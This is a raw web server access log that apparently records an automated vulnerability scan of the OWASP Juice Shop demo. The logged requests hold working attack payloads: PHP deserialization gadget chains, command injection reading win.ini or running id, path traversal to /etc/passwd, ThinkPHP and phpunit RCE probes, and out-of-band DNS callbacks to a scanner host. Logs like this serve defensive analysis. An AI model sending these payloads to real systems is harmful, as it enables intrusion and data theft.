44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /redirect?to=a:2:{i:7%3BO:37:"PHPExcel_CachedObjectStorage_DiscISAM":2:{s:48:"%00PHPExcel_CachedObjectStorage_DiscISAM%00_fileName"%3BO:17:"PHPExcel_RichText":1:{s:36:"%00PHPExcel_RichText%00_richTextElements"%3BO:33:"Requests_Utility_FilteredIterator":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:11:"tenable.was"%3B}i:2%3Ba:1:{s:11:"%00*%00callback"%3Bs:13:"gethostbyname"%3B}i:3%3BN%3B}}s:50:"%00PHPExcel_CachedObjectStorage_DiscISAM%00_fileHandle"%3Bi:42%3B}i:7%3Bi:7%3B} HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /redirect?to=a%3A2%3A%7Bi%3A7%253BO%3A15%3A%22Zend%5CLog%5CLogger%22%3A1%3A%7Bs%3A10%3A%22%2500%2A%2500writers%22%253Ba%3A1%3A%7Bi%3A0%253BO%3A20%3A%22Zend%5CLog%5CWriter%5CMail%22%3A3%3A%7Bs%3A15%3A%22%2500%2A%2500eventsToMail%22%253Ba%3A1%3A%7Bi%3A0%253Bi%3A0%253B%7Ds%3A21%3A%22%2500%2A%2500subjectPrependText%22%253Bs%3A0%3A%22%22%253Bs%3A24%3A%22%2500%2A%2500numEntriesPerPriority%22%253Ba%3A1%3A%7Bi%3A0%253BO%3A14%3A%22Zend%5CTag%5CCloud%22%3A2%3A%7Bs%3A7%3A%22%2500%2A%2500tags%22%253Ba%3A1%3A%7Bi%3A0%253Bs%3A0%3A%22%22%253B%7Ds%3A15%3A%22%2500%2A%2500tagDecorator%22%253BO%3A34%3A%22Zend%5CTag%5CCloud%5CDecorator%5CHtmlCloud%22%3A3%3A%7Bs%3A12%3A%22%2500%2A%2500separator%22%253Bs%3A0%3A%22%22%253Bs%3A10%3A%22%2500%2A%2500escaper%22%253BO%3A20%3A%22Zend%5CEscaper%5CEscaper%22%3A1%3A%7Bs%3A18%3A%22%2500%2A%2500htmlAttrMatcher%22%253Ba%3A2%3A%7Bi%3A0%253BO%3A23%3A%22Zend%5CFilter%5CFilterChain%22%3A1%3A%7Bs%3A10%3A%22%2500%2A%2500filters%22%253BO%3A13%3A%22SplFixedArray%22%3A2%3A%7Bi%3A0%253Ba%3A2%3A%7Bi%3A0%253BO%3A14%3A%22Zend%5CJson%5CExpr%22%3A1%3A%7Bs%3A13%3A%22%2500%2A%2500expression%22%253Bs%3A11%3A%22tenable.was%22%253B%7Di%3A1%253Bs%3A10%3A%22__toString%22%253B%7Di%3A1%253Bs%3A13%3A%22gethostbyname%22%253B%7D%7Di%3A1%253Bs%3A6%3A%22filter%22%253B%7D%7Ds%3A11%3A%22%2500%2A%2500htmlTags%22%253Ba%3A1%3A%7Bs%3A1%3A%22h%22%253Ba%3A1%3A%7Bs%3A1%3A%22a%22%253Bs%3A1%3A%22%21%22%253B%7D%7D%7D%7D%7D%7D%7D%7Di%3A7%253Bi%3A7%253B%7D HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /redirect?to=a:2:{i:7%3BO:15:"Zend\Log\Logger":1:{s:10:"%00*%00writers"%3Ba:1:{i:0%3BO:20:"Zend\Log\Writer\Mail":3:{s:15:"%00*%00eventsToMail"%3Ba:1:{i:0%3Bi:0%3B}s:21:"%00*%00subjectPrependText"%3Bs:0:""%3Bs:24:"%00*%00numEntriesPerPriority"%3Ba:1:{i:0%3BO:14:"Zend\Tag\Cloud":2:{s:7:"%00*%00tags"%3Ba:1:{i:0%3Bs:0:""%3B}s:15:"%00*%00tagDecorator"%3BO:34:"Zend\Tag\Cloud\Decorator\HtmlCloud":3:{s:12:"%00*%00separator"%3Bs:0:""%3Bs:10:"%00*%00escaper"%3BO:20:"Zend\Escaper\Escaper":1:{s:18:"%00*%00htmlAttrMatcher"%3Ba:2:{i:0%3BO:23:"Zend\Filter\FilterChain":1:{s:10:"%00*%00filters"%3BO:13:"SplFixedArray":2:{i:0%3Ba:2:{i:0%3BO:14:"Zend\Json\Expr":1:{s:13:"%00*%00expression"%3Bs:11:"tenable.was"%3B}i:1%3Bs:10:"__toString"%3B}i:1%3Bs:13:"gethostbyname"%3B}}i:1%3Bs:6:"filter"%3B}}s:11:"%00*%00htmlTags"%3Ba:1:{s:1:"h"%3Ba:1:{s:1:"a"%3Bs:1:"!"%3B}}}}}}}}i:7%3Bi:7%3B} HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /redirect?to=YToyOntpOjc7TzoxNToiWmVuZFxMb2dcTG9nZ2VyIjoxOntzOjEwOiIAKgB3cml0ZXJzIjthOjE6e2k6MDtPOjIwOiJaZW5kXExvZ1xXcml0ZXJcTWFpbCI6Mzp7czoxNToiACoAZXZlbnRzVG9NYWlsIjthOjE6e2k6MDtpOjA7fXM6MjE6IgAqAHN1YmplY3RQcmVwZW5kVGV4dCI7czowOiIiO3M6MjQ6IgAqAG51bUVudHJpZXNQZXJQcmlvcml0eSI7YToxOntpOjA7TzoxNDoiWmVuZFxUYWdcQ2xvdWQiOjI6e3M6NzoiACoAdGFncyI7YToxOntpOjA7czowOiIiO31zOjE1OiIAKgB0YWdEZWNvcmF0b3IiO086MzQ6IlplbmRcVGFnXENsb3VkXERlY29yYXRvclxIdG1sQ2xvdWQiOjM6e3M6MTI6IgAqAHNlcGFyYXRvciI7czowOiIiO3M6MTA6IgAqAGVzY2FwZXIiO086MjA6IlplbmRcRXNjYXBlclxFc2NhcGVyIjoxOntzOjE4OiIAKgBodG1sQXR0ck1hdGNoZXIiO2E6Mjp7aTowO086MjM6IlplbmRcRmlsdGVyXEZpbHRlckNoYWluIjoxOntzOjEwOiIAKgBmaWx0ZXJzIjtPOjEzOiJTcGxGaXhlZEFycmF5IjoyOntpOjA7YToyOntpOjA7TzoxNDoiWmVuZFxKc29uXEV4cHIiOjE6e3M6MTM6IgAqAGV4cHJlc3Npb24iO3M6ODg6ImRicmd4c2RnYmg3d3RyZWtwdWhhcnZtbnRjYmMyNmJ6bnFxNmtpMzJmcGNmdndzem93aGEud2FzLm0uY2xvdWQuYXdzLnRlbmFibGVzZWN1cml0eS5jb20iO31pOjE7czoxMDoiX190b1N0cmluZyI7fWk6MTtzOjEzOiJnZXRob3N0YnluYW1lIjt9fWk6MTtzOjY6ImZpbHRlciI7fX1zOjExOiIAKgBodG1sVGFncyI7YToxOntzOjE6ImgiO2E6MTp7czoxOiJhIjtzOjE6IiEiO319fX19fX19aTo3O2k6Nzt9 HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /redirect?to=YToyOntpOjc7TzoxNToiWmVuZFxMb2dcTG9nZ2VyIjoxOntzOjEwOiIAKgB3cml0ZXJzIjthOjE6e2k6MDtPOjIwOiJaZW5kXExvZ1xXcml0ZXJcTWFpbCI6Mzp7czoxNToiACoAZXZlbnRzVG9NYWlsIjthOjE6e2k6MDtpOjA7fXM6MjE6IgAqAHN1YmplY3RQcmVwZW5kVGV4dCI7czowOiIiO3M6MjQ6IgAqAG51bUVudHJpZXNQZXJQcmlvcml0eSI7YToxOntpOjA7TzoxNDoiWmVuZFxUYWdcQ2xvdWQiOjI6e3M6NzoiACoAdGFncyI7YToxOntpOjA7czowOiIiO31zOjE1OiIAKgB0YWdEZWNvcmF0b3IiO086MzQ6IlplbmRcVGFnXENsb3VkXERlY29yYXRvclxIdG1sQ2xvdWQiOjM6e3M6MTI6IgAqAHNlcGFyYXRvciI7czowOiIiO3M6MTA6IgAqAGVzY2FwZXIiO086MjA6IlplbmRcRXNjYXBlclxFc2NhcGVyIjoxOntzOjE4OiIAKgBodG1sQXR0ck1hdGNoZXIiO2E6Mjp7aTowO086MjM6IlplbmRcRmlsdGVyXEZpbHRlckNoYWluIjoxOntzOjEwOiIAKgBmaWx0ZXJzIjtPOjEzOiJTcGxGaXhlZEFycmF5IjoyOntpOjA7YToyOntpOjA7TzoxNDoiWmVuZFxKc29uXEV4cHIiOjE6e3M6MTM6IgAqAGV4cHJlc3Npb24iO3M6ODg6ImRicmd4c2RnYmg3d3RyZWtwdWhhcnZtbnRjYmMyNmJ6bnFxNmtpMzJmcGNmdndzem93aGEud2FzLm0uY2xvdWQuYXdzLnRlbmFibGVzZWN1cml0eS5jb20iO31pOjE7czoxMDoiX190b1N0cmluZyI7fWk6MTtzOjEzOiJnZXRob3N0YnluYW1lIjt9fWk6MTtzOjY6ImZpbHRlciI7fX1zOjExOiIAKgBodG1sVGFncyI7YToxOntzOjE6ImgiO2E6MTp7czoxOiJhIjtzOjE6IiEiO319fX19fX19aTo3O2k6Nzt9 HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /redirect?to=a:2:{i:7%3BO:23:"yii\db\BatchQueryResult":1:{s:36:"%00yii\db\BatchQueryResult%00_dataReader"%3BO:17:"yii\db\Connection":2:{s:3:"pdo"%3Bi:1%3Bs:3:"dsn"%3BO:26:"yii\db\ColumnSchemaBuilder":2:{s:7:"%00*%00type"%3Bs:1:"x"%3Bs:11:"categoryMap"%3BO:22:"yii\caching\ArrayCache":2:{s:10:"serializer"%3Ba:1:{i:1%3Bs:13:"gethostbyname"%3B}s:30:"%00yii\caching\ArrayCache%00_cache"%3Ba:1:{s:1:"x"%3Ba:2:{i:0%3Bs:11:"tenable.was"%3Bi:1%3Bi:0%3B}}}}}}i:7%3Bi:7%3B} HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /error_log HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /php_error_log HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:56 +0000] "GET /nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=http://example.com/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /was_tnb?+--env=dev HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /apc.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /opcache.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /ocp.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /phpsysinfo/index.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:56 +0000] "GET /op.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /js/routing?callback=fos.Router.setData HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /_fragment HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_get_contents&vars%5B1%5D%5B%5D=index.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:57 +0000] "POST /nagiosql/admin/helpedit.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /assets/public/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "POST /index.php?s=captcha HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /index.php?s=index/think%5CError/appError&errno=1&errstr=%3C&errline=1&errfile=../../../../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /type%20C:%5CWindows%5Cwin.ini HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /%7C%7Ctype%20C:%5CWindows%5Cwin.ini HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /%7Ctype%20C:%5CWindows%5Cwin.ini HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /was_tnb_404 HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /app/node_modules/express/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /assets/public/images/products/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:57 +0000] "GET /static%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cshells HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /app/node_modules/express/lib/router/index.js:365:14 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /assets/public/css/styles.css HTTP/1.1" 200 80117 "https://demo.owasp-juice.shop/assets/public/css/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /id HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /%7Cid HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /app/node_modules/express-jwt/lib/polyfills.js HTTP/1.1" 200 80117 "https://demo.owasp-juice.shop/app/node_modules/express-jwt/lib/index.js:44:7" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:31:57 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:57 +0000] "GET /static/../../../../../../../../../../../etc/shells HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%7Ctype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 302 95 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=%7Ctype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shoptype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 302 94 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=%3Btype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=type%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:57 +0000] "GET /api/6/nginx HTTP/1.1" 500 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /%60id%60 HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:57 +0000] "GET /api/5/nginx HTTP/1.1" 500 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /&&id HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:57 +0000] "GET /api/4/nginx HTTP/1.1" 500 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%3Btype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 302 95 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%7C%7Ctype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 302 96 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:57 +0000] "GET /redirect?to=%7C%7Ctype%20C%3A%5CWindows%5Cwin.ini HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%7Cid HTTP/1.1" 302 72 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=id HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%3Bid HTTP/1.1" 302 72 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shopid HTTP/1.1" 302 71 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%3Bid HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%7Cid HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%60id%60 HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%60id%60 HTTP/1.1" 302 77 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%26%26id HTTP/1.1" 302 81 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%26%26id HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:31:58 +0000] "GET /api/3/nginx HTTP/1.1" 500 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shopecho%20YWlhdnR6cnpoZG1sb290d25hemYyZnNtaHltcDZzcXE2cjQzc3BsdzVrN2tzMmg1YnFwcS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 302 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%7Cecho%20bmtsZ3loNW9uNTN0dWNkZXlreWxvNjNwbnY3MmVqaWsyc3VpbnpubHc1M2o1cHhzNGN6YS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 302 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%3Becho%20c2xvdDZreHFjMzI2eG82dmJyajN5cG9mb21mcHUybWIzN2Q3ZXhrdnpqcXc2a3JlMnNpcS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 302 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=echo%20YWlhdnR6cnpoZG1sb290d25hemYyZnNtaHltcDZzcXE2cjQzc3BsdzVrN2tzMmg1YnFwcS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:31:58 +0000] "GET /redirect?to=%60echo%20bGg3dWN2emJ3enZ4ZnRmNHphbHR0dmVtYTZ2dXBkbGwzbzJ2Mm83ZzZ6cG4ybXBuejJpYS53YXMubS5jbG91ZC5hd3MudGVuYWJsZXNlY3VyaXR5LmNvbQ%3D%3D%20%7C%20base64%20-d%20%7C%20xargs%20getent%20ahosts%60 HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
